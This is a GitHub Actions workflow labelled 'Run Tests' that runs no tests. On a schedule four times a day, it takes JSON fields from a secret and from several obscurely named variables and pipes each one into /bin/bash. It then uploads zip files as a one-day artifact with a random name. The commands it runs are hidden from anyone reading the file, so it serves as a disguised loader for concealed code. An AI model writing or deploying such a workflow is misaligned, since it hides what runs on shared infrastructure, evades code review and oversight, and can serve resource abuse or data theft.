name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '35 4,10,16,22 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          xxj400: ${{ secrets.xxj400 }}
        run: |
          printf '%s' "$xxj400" | jq -r .qhd3 | /bin/bash
          printf '%s' "$zpz933" | jq -r .x25 | /bin/bash
          echo $b8499 | jq -r .dlmk24719 | /bin/bash
          echo $em99825 | jq -r .vmkgp5 | /bin/bash
          printf '%s' "$zdx5" | jq -r .ufhk4727 | /bin/bash

      - name: Save output
        uses: actions/upload-artifact@v4
        with:
          name: ncrFeTJz
          path: "*.zip"
          retention-days: 1
